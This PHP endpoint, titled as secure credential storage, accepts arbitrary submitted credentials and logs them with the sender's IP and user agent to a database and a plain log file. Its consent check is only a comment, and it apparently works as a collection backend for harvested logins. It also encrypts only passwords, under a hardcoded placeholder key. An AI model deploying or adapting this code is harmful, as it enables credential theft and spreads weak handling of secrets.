<?php
/**
 * Secure Credential Storage Endpoint
 * Developer: Adugna Gizaw
 */
require_once __DIR__ . '/../includes/config.php';
require_once __DIR__ . '/../includes/db.php';
require_once __DIR__ . '/../includes/auth.php';

// Verify user consent session
session_start();

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('HTTP/1.1 405 Method Not Allowed');
    exit();
}

// Get and validate input
$data = json_decode(file_get_contents('php://input'), true);
if (!$data || !isset($data['credentials'])) {
    header('HTTP/1.1 400 Bad Request');
    die('Invalid input');
}

// Prepare log entry
$logEntry = [
    'timestamp' => date('Y-m-d H:i:s'),
    'user_id' => $_SESSION['user_id'] ?? 'unknown',
    'ip_address' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'credentials' => $data['credentials']
];

// Encrypt sensitive data before storage
function encryptData($data, $key) {
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
    return base64_encode($iv . $encrypted);
}

$encryptionKey = 'your-strong-encryption-key'; // Store this securely in config
foreach ($logEntry['credentials'] as &$cred) {
    if (isset($cred['password'])) {
        $cred['password'] = encryptData($cred['password'], $encryptionKey);
    }
}

// Store in database
try {
    $stmt = $pdo->prepare("INSERT INTO logs 
                          (user_id, ip_address, user_agent, credentials_data) 
                          VALUES (?, ?, ?, ?)");
    $stmt->execute([
        $logEntry['user_id'],
        $logEntry['ip_address'],
        $logEntry['user_agent'],
        json_encode($logEntry)
    ]);
} catch (PDOException $e) {
    error_log("Database error: " . $e->getMessage());
    header('HTTP/1.1 500 Internal Server Error');
    echo json_encode(['status' => 'error', 'message' => 'Database error']);
    exit();
}

// Also append to log file
$logFile = __DIR__ . '/../logs/logs.log';
file_put_contents($logFile, json_encode($logEntry) . PHP_EOL, FILE_APPEND);

// Respond with success
header('Content-Type: application/json');
echo json_encode(['status' => 'success']);